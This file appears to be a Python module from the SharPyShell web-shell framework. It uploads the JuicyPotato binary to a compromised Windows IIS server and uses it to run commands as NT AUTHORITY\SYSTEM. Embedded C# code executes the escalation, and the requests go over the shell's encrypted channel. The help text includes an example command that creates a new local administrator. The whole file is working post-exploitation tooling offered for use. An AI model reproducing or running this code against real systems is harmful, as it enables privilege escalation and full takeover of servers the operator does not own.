from core.Module import Module, ModuleException
from core import config
from modules.upload import Upload
from modules.exec_cmd import Exec_cmd
from utils.random_string import random_generator
import random
import traceback


class PrivescJuicyPotatoModuleException(ModuleException):
    pass


class Privesc_juicy_potato(Module):
    _exception_class = PrivescJuicyPotatoModuleException
    short_help = r"Launch Juicy Potato attack trying to impersonate NT AUTHORITY\SYSTEM"
    complete_help = r"""
        Juicy Potato is a Local Privilege Escalation tool that allows to escalate privileges from a Windows Service
        Accounts to NT AUTHORITY\SYSTEM.
        This permits to run an os command as the most privileged user 'NT AUTHORITY\SYSTEM'.
        It is needed that the service account running w3wp.exe has the permission of 'SeImpersonatePrivilege' enabled. 
        You can check it with 'whoami /priv' 
        
        This vulnerability is no longer exploitable with Windows Server 2019:
        https://decoder.cloud/2018/10/29/no-more-rotten-juicy-potato/
        
        Source Code:
            https://github.com/ohpe/juicy-potato
            
        Usage:
            #privesc_juicy_potato cmd [custom_args]
        
        Positional arguments:
            cmd             command supported by cmd.exe
            custom_args     command line parameters to be passed to juicy potato binary
                            Default: ' -t * -l ' + str(random.randint(10000, 65000)) + ' -p '
        
        Examples:
            Add a new local admin:
                #privesc_juicy_potato 'net user /add admin_test JuicyAdmin_1 & net localgroup Administrators admin_test /add'
    """

    _runtime_code = ur"""
                   using System;using System.IO;using System.Diagnostics;using System.Text;
                   public class SharPyShell
                   {                    
                       string ExecCmd(string exe_path, string custom_args, string cmd, string working_path)
                       {
                           string cmd_path = Environment.GetEnvironmentVariable("ComSpec");
                           ProcessStartInfo pinfo = new ProcessStartInfo();
                           pinfo.FileName = exe_path;
                           pinfo.Arguments = custom_args + " " + cmd_path + " -a \" " + cmd_path + " /c " + cmd + "\"";
                           pinfo.RedirectStandardOutput = true;
                           pinfo.RedirectStandardError = true;
                           pinfo.UseShellExecute = false;
                           pinfo.WorkingDirectory = working_path;
                           Process p = new Process();
                           try{
                               p = Process.Start(pinfo);
                           }
                           catch (Exception e){
                               return "{{{SharPyShellError}}}\n" + e;
                           }
                           StreamReader stmrdr_output = p.StandardOutput;
                           StreamReader stmrdr_errors = p.StandardError;
                           string output = "";
                           string stand_out = stmrdr_output.ReadToEnd();
                           string stand_errors = stmrdr_errors.ReadToEnd();
                           stmrdr_output.Close();
                           stmrdr_errors.Close();
                           if (!String.IsNullOrEmpty(stand_out))
                               output = output + stand_out;
                           if (!String.IsNullOrEmpty(stand_errors))
                               output = "{{{SharPyShellError}}}\n" + output + stand_errors;
                           return output;
                       }

                       public byte[] ExecRuntime()
                       {
                           string output_func=ExecCmd(@"%s", @"%s", @"%s", @"%s");
                           byte[] output_func_byte=Encoding.UTF8.GetBytes(output_func);
                           return(output_func_byte);
                       }
                   }
                   """

    __default_custom_args = ' -t * -l ' + str(random.randint(10000, 65000)) + ' -p '

    def __init__(self, password, channel_enc_mode, module_settings, request_object):
        Module.__init__(self, password, channel_enc_mode, module_settings, request_object)
        self.upload_module_object = Upload(password, channel_enc_mode, module_settings, request_object)
        self.exec_cmd_module_object = Exec_cmd(password, channel_enc_mode, module_settings, request_object)

    def __parse_run_args(self, args):
        if len(args) < 1:
            raise self._exception_class('#privesc_juicy_potato : Not enough arguments.1 Argument required. \n')
        args_parser = {k: v for k, v in enumerate(args)}
        cmd = args_parser.get(0)
        custom_args = args_parser.get(1, self.__default_custom_args)
        return cmd, custom_args

    def __lookup_binary(self):
        if 'JuicyPotato.exe' in self._module_settings.keys():
            bin_path = self._module_settings['JuicyPotato.exe']
        else:
            exe_path = config.modules_paths + 'exe_modules/JuicyPotato.exe'
            remote_upload_path = self._module_settings['env_directory'] + '\\' + random_generator() + '.exe'
            print '\n\n\nUploading Juicy Potato binary....\n'
            upload_response = self._parse_response(self.upload_module_object.run([exe_path, remote_upload_path]))
            print upload_response
            self._module_settings['JuicyPotato.exe'] = remote_upload_path
            bin_path = remote_upload_path
        return bin_path

    def _create_request(self, args):
        exe_path, custom_args, cmd = args
        working_path = self._module_settings['working_directory']
        return self._runtime_code % (exe_path, custom_args, cmd, working_path)

    def run(self, args):
        try:
            cmd, custom_args = self.__parse_run_args(args)
            upload_path = self.__lookup_binary()
            request = self._create_request([upload_path, custom_args, cmd])
            encrypted_request = self._encrypt_request(request)
            encrypted_response = self._post_request(encrypted_request)
            decrypted_response = self._decrypt_response(encrypted_response)
            parsed_response = self._parse_response(decrypted_response)
            parsed_response = '\n\n\nModule executed correctly:\n' + parsed_response
        except ModuleException as module_exc:
            parsed_response = str(module_exc)
        except Exception:
            parsed_response = '{{{' + self._exception_class.__name__ + '}}}' + '{{{PythonError}}}\n' + str(traceback.format_exc())
        return parsed_response
